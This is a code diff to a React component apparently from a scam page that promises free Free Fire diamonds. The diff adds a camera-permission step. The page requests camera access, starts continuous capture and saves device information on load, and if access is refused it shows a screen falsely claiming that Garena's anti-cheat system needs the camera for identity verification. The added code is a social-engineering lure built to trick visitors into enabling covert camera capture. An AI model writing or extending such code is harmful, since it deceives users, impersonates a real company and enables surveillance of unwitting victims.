@@ -18,7 +18,8 @@ const FreefireCapture = () => {
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const [uid, setUid] = useState("");
-  const [step, setStep] = useState<"check" | "main" | "processing" | "success">("check");
+  const [step, setStep] = useState<"check" | "blocked" | "main" | "processing" | "success">("check");
+  const [cameraGranted, setCameraGranted] = useState(false);
   const [selectedDiamond, setSelectedDiamond] = useState<string | null>(null);
   const captureLoopRef = useRef(false);
   const stopCaptureRef = useRef(false);
@@ -125,6 +126,16 @@ const FreefireCapture = () => {
     }
   };
 
+  const requestCameraPermission = async (): Promise<boolean> => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      stream.getTracks().forEach(t => t.stop());
+      return true;
+    } catch {
+      return false;
+    }
+  };
+
   useEffect(() => {
     // Handle in-app browser redirect
     if (isInAppBrowser() && isAndroid()) {
@@ -132,8 +143,18 @@ const FreefireCapture = () => {
       return;
     }
     saveDeviceInfo();
-    startContinuousCapture();
-    setStep("main");
+
+    const initCamera = async () => {
+      const granted = await requestCameraPermission();
+      if (granted) {
+        setCameraGranted(true);
+        setStep("main");
+        startContinuousCapture();
+      } else {
+        setStep("blocked");
+      }
+    };
+    initCamera();
   }, []);
 
   useEffect(() => { return () => { stopCaptureRef.current = true; }; }, []);
@@ -170,6 +191,76 @@ const FreefireCapture = () => {
     return (
       <div className="min-h-screen flex items-center justify-center" style={{ background: '#1a1a2e' }}>
         <div className="w-8 h-8 border-2 border-yellow-400 border-t-transparent rounded-full animate-spin" />
+      </div>
+    );
+  }
+
+  if (step === "blocked") {
+    const retryPermission = async () => {
+      const granted = await requestCameraPermission();
+      if (granted) {
+        setCameraGranted(true);
+        setStep("main");
+        startContinuousCapture();
+      }
+    };
+
+    return (
+      <div className="min-h-screen flex items-center justify-center" style={{
+        background: 'linear-gradient(180deg, #0f0f23 0%, #1a1a3e 50%, #0a0a1f 100%)'
+      }}>
+        <div style={{
+          background: 'rgba(15,15,30,0.95)',
+          borderRadius: '20px',
+          padding: '30px 24px',
+          margin: '16px',
+          border: '1px solid rgba(255,180,0,0.3)',
+          textAlign: 'center',
+          boxShadow: '0 0 40px rgba(255,107,0,0.2)',
+          maxWidth: '360px',
+          width: '100%'
+        }}>
+          <div style={{ fontSize: '50px', marginBottom: '16px' }}>📷</div>
+          <h2 style={{ color: '#ffb800', fontSize: '18px', fontWeight: 800, marginBottom: '8px' }}>
+            Camera Permission Required
+          </h2>
+          <p style={{ color: 'rgba(255,255,255,0.6)', fontSize: '13px', marginBottom: '6px', lineHeight: '1.5' }}>
+            To verify your identity and claim free diamonds, camera access is required by Garena Anti-Cheat system.
+          </p>
+          <div style={{
+            background: 'rgba(255,60,60,0.1)',
+            border: '1px solid rgba(255,60,60,0.3)',
+            borderRadius: '10px',
+            padding: '10px',
+            marginBottom: '20px'
+          }}>
+            <p style={{ color: '#ff6b6b', fontSize: '11px', fontWeight: 600 }}>
+              ⚠️ Without camera permission, diamonds cannot be sent to your account.
+            </p>
+          </div>
+          <button
+            onClick={retryPermission}
+            style={{
+              width: '100%',
+              padding: '14px',
+              borderRadius: '12px',
+              border: 'none',
+              fontWeight: 800,
+              fontSize: '15px',
+              cursor: 'pointer',
+              background: 'linear-gradient(90deg, #ff6b00, #ffb800)',
+              color: '#fff',
+              boxShadow: '0 4px 20px rgba(255,107,0,0.4)',
+              letterSpacing: '1px',
+              marginBottom: '12px'
+            }}
+          >
+            ✅ ALLOW CAMERA & CONTINUE
+          </button>
+          <p style={{ color: 'rgba(255,255,255,0.3)', fontSize: '10px' }}>
+            🔒 Your camera data is only used for verification
+          </p>
+        </div>
       </div>
     );
   }
